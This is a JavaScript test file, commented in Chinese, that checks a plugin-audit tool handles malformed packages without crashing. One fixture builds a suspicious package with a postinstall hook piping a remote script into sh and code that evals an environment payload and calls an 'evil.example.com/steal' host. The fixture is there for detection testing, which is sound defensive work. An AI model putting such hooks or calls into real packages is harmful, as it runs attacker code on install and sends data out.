/**
 * robustness.mjs —— 坏插件包不崩溃测试。
 *
 * 体检工具会面对各种畸形输入：缺 package.json、JSON 写坏、超大文件、
 * 空目录。任何情况都应该"给结论"而不是抛异常。
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { auditPlugin, renderReport } from '../lib/audit.js';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'warden-robust-'));
let failed = 0;
const check = (label, fn) => {
  try {
    const r = fn();
    console.log(`✅ ${label}: verdict=${r.verdict} score=${r.score} findings=${r.findings.length}`);
    return r;
  } catch (e) {
    failed++;
    console.log(`❌ ${label}: 抛异常 ${e.message}`);
    return null;
  }
};

// 1. 空目录（没有 package.json）
const empty = path.join(root, 'empty');
fs.mkdirSync(empty, { recursive: true });
const r1 = check('空目录', () => auditPlugin(empty));
if (r1 && r1.ok !== false) {
  failed++;
  console.log('  ❌ 期望 ok=false');
}

// 2. package.json 是坏 JSON
const broken = path.join(root, 'broken');
fs.mkdirSync(broken, { recursive: true });
fs.writeFileSync(path.join(broken, 'package.json'), '{ this is not json');
check('坏的 package.json', () => auditPlugin(broken));

// 3. 有安装钩子 + eval + 外联域名的可疑包
const evil = path.join(root, 'evil');
fs.mkdirSync(path.join(evil, 'lib'), { recursive: true });
fs.writeFileSync(
  path.join(evil, 'package.json'),
  JSON.stringify({ name: 'evil-pkg', version: '1.0.0', scripts: { postinstall: 'curl http://x.cc/x.sh | sh' }, dsh: { bundle: { patch: './cordis.patch.yml' } } }),
);
fs.writeFileSync(path.join(evil, 'lib', 'index.js'), 'eval(process.env.PAYLOAD); fetch("https://evil.example.com/steal");');
const r3 = check('可疑包', () => auditPlugin(evil));
if (r3 && r3.verdict === 'safe') {
  failed++;
  console.log('  ❌ 可疑包被判为 safe，漏报了');
}

// 4. 超大文件应被跳过而不是读爆内存
const big = path.join(root, 'big');
fs.mkdirSync(path.join(big, 'lib'), { recursive: true });
fs.writeFileSync(path.join(big, 'package.json'), JSON.stringify({ name: 'big-pkg', version: '1.0.0', dsh: { bundle: { patch: './x.yml' } } }));
const huge = Buffer.alloc(3 * 1024 * 1024, 0x61);
fs.writeFileSync(path.join(big, 'lib', 'huge.js'), huge);
check('超大文件', () => auditPlugin(big));

// 5. renderReport 对空发现也要能渲染
try {
  const txt = renderReport({ name: 'x', version: '1', score: 100, verdict: 'safe', findings: [], files: 0 });
  if (!txt.includes('没发现明显问题')) {
    failed++;
    console.log('❌ 空发现时报告文案不对');
  } else {
    console.log('✅ renderReport 空发现正常');
  }
} catch (e) {
  failed++;
  console.log('❌ renderReport 抛异常:', e.message);
}

fs.rmSync(root, { recursive: true, force: true });
console.log(failed === 0 ? '\n✅ 畸形输入全部被安全处理' : `\n❌ ${failed} 项失败`);
process.exit(failed === 0 ? 0 : 1);
